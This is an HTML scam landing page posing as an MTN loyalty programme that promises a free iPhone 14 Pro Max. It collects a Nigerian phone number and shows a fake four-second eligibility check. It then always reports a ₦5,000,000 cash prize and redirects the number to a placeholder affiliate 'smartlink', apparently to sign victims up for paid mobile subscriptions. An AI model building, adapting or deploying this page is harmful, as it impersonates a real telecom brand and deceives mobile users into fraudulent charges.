<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Loyalty Reward Program</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      margin: 0;
      padding: 0;
      color: #333;
    }
    .container {
      max-width: 400px;
      margin: 50px auto;
      background: #fff;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
    }
    .header {
      text-align: center;
    }
    .header h1 {
      font-size: 22px;
      color: #f7b500;
    }
    .subtext {
      font-size: 15px;
      margin-top: 10px;
      text-align: center;
    }
    .input-group {
      margin-top: 30px;
    }
    input[type="tel"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background: #f7b500;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }
    .loading-screen, .popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.9);
      color: #fff;
      z-index: 999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 20px;
      text-align: center;
    }
    .popup button {
      margin-top: 20px;
      background: #25d366;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>MTN Loyalty Reward Program</h1>
      <div class="subtext">
        You may be eligible to win a free iPhone 14 Pro Max. Enter your number below to check eligibility.
      </div>
    </div>
    <div class="input-group">
      <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
      <button onclick="startCheck()">Check Eligibility</button>
    </div>
  </div>  <div class="loading-screen" id="loading">
    <h2>Checking your eligibility...</h2>
  </div>  <div class="popup" id="result">
    <h2>Sorry ðŸ˜¢</h2>
    <p>You did not qualify for the iPhone giveaway.<br>
    But you have qualified for our â‚¦5,000,000 cash prize reward ðŸŽ‰</p>
    <button onclick="redirectToOffer()">Enter your number to subscribe and claim</button>
  </div>  <script>
    function startCheck() {
      const number = document.getElementById('msisdn').value;
      if (!/^0[789][01]\d{8}$/.test(number)) {
        alert('Please enter a valid 11-digit Nigerian number');
        return;
      }
      document.getElementById('loading').style.display = 'flex';
      setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('result').style.display = 'flex';
      }, 4000);
    }

    function redirectToOffer() {
      const number = document.getElementById('msisdn').value;
      // Smartlink will detect MTN or Airtel automatically
      window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
    }
  </script></body>
</html>
